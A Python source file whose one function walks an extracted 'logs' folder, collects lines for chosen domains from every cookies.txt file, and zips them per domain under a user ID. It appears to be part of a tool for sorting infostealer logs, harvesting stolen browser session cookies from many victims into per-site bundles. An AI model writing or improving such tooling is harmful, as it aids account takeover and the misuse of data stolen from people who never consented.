import os
import re
import zipfile
from config import Config

# In cookie_helper.py

# In cookie_helper.py

def process_cookies_from_logs(logs_dir, domains, user_id):
    """
    UPDATED: Finds only 'cookies.txt' or 'Cookies.txt' files, extracts lines for
    specified domains, and creates a separate zip archive for each domain.
    """
    found_cookies_by_domain = {domain: [] for domain in domains}
    
    # Walk through the entire extracted directory
    for root, _, files in os.walk(logs_dir):
        # Look for the target cookie file (case-insensitive)
        cookie_file_name = None
        for f in files:
            if f.lower() == "cookies.txt":
                cookie_file_name = f
                break
        
        # If we found a cookie file in this directory, process it
        if cookie_file_name:
            cookies_file_path = os.path.join(root, cookie_file_name)
            try:
                with open(cookies_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
            except Exception:
                continue # Skip files that can't be read

            domain_lines_in_file = {domain: [] for domain in domains}
            
            for line in lines:
                for domain in domains:
                    if line.strip().startswith(domain) or line.strip().startswith("." + domain):
                        domain_lines_in_file[domain].append(line.strip())
            
            for domain, lines_found in domain_lines_in_file.items():
                if lines_found:
                    serial_number = len(found_cookies_by_domain[domain]) + 1
                    safe_domain_name = re.sub(r'[^a-zA-Z0-9]', '_', domain)
                    output_txt_name = f"{safe_domain_name}_{serial_number}_{user_id}.txt"
                    output_txt_path = os.path.join(logs_dir, output_txt_name)
                    
                    with open(output_txt_path, 'w', encoding='utf-8') as out_file:
                        out_file.write("\n".join(lines_found))
                    
                    found_cookies_by_domain[domain].append(output_txt_path)

    # After checking all files, create the zip archives (this part remains the same)
    zip_paths = []
    for domain, txt_files in found_cookies_by_domain.items():
        if txt_files:
            safe_domain_name = re.sub(r'[^a-zA-Z0-9]', '_', domain)
            zip_path = os.path.join(logs_dir, f"{safe_domain_name}.zip")
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for txt_file in txt_files:
                    zipf.write(txt_file, os.path.basename(txt_file))
            zip_paths.append(zip_path)
            
    return zip_paths
